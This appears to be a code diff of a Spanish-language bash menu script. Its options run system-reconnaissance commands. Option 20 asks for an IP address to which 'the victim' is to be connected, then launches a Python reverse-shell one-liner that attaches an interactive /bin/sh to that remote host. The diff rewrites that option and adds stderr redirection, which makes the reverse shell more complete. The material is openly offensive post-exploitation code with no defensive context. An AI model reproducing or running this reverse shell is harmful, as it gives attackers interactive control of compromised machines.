@@ -30,7 +30,7 @@ read -p "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar 
 
      		99) exit ;;
 		10) pwd ;;  	
-		6) ls ;;
+		8) ls ;;
 		7) ifconfig ;;
 		1) uname -a ;;
 		2) lscpu ;;
@@ -40,9 +40,7 @@ read -p "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar 
 		5) who -a ;;
 		6) cat /proc/version ;;
 		11) clear ;;
-		20) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && read -p "INtroduzca un puerto > " puerto && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);p=subprocess.call(["/bin/sh","-i"]);'
-
-		
+		20) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && echo "Escriba el puerto al que quieres reedirigir la sesion" && read -p "> " puerto && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 
 	esac
